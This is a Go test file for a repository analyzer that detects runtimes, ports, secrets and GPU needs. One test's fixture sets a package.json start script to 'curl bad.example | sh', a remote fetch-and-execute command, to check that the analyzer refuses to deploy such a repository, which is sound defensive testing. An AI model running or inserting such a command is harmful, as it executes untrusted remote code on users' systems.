package analyzer

import (
	"os"
	"path/filepath"
	"testing"
)

func TestAnalyzeComposeNode(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "compose.yaml"), "services:\n  web:\n    build: .\n    ports:\n      - \"3000:3000\"\n")
	mustWrite(t, filepath.Join(dir, "package.json"), `{"scripts":{"start":"node server.js"}}`)
	mustWrite(t, filepath.Join(dir, ".env.example"), "DATABASE_URL=\nAPI_KEY=replace-me\n")

	p, err := Analyze(dir, dir, "local", "")
	if err != nil {
		t.Fatal(err)
	}
	if p.Runtime.Executor != "docker-compose" || !p.Runtime.Deployable {
		t.Fatalf("unexpected runtime: %+v", p.Runtime)
	}
	if len(p.Ports) != 1 || p.Ports[0] != 3000 {
		t.Fatalf("unexpected ports: %#v", p.Ports)
	}
	if len(p.Secrets) != 2 {
		t.Fatalf("unexpected secrets: %#v", p.Secrets)
	}
}

func TestAnalyzeVLLMRequiresGPU(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "Dockerfile"), "FROM vllm/vllm-openai:latest\nEXPOSE 8000\n")
	p, err := Analyze(dir, dir, "local", "")
	if err != nil {
		t.Fatal(err)
	}
	if !p.Requirements.GPURequired {
		t.Fatal("expected GPU requirement")
	}
	if p.Runtime.Executor != "docker" {
		t.Fatalf("unexpected executor: %s", p.Runtime.Executor)
	}
}

func TestNoArbitraryRuntimeExecution(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "package.json"), `{"scripts":{"start":"curl bad.example | sh"}}`)
	p, err := Analyze(dir, dir, "local", "")
	if err != nil {
		t.Fatal(err)
	}
	if p.Runtime.Deployable {
		t.Fatal("node-only repository must not be executable in v0.1")
	}
	if p.Runtime.Executor != "unsupported" {
		t.Fatalf("unexpected executor: %s", p.Runtime.Executor)
	}
}

func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestGitHubSourceUsesRepositoryName(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "Dockerfile"), "FROM scratch\n")
	p, err := Analyze(dir, "https://github.com/lumenstech/example-repo.git", "github", "abc123")
	if err != nil {
		t.Fatal(err)
	}
	if p.App.Name != "example-repo" {
		t.Fatalf("app name=%q", p.App.Name)
	}
	if p.Source.Revision != "abc123" {
		t.Fatalf("revision=%q", p.Source.Revision)
	}
}
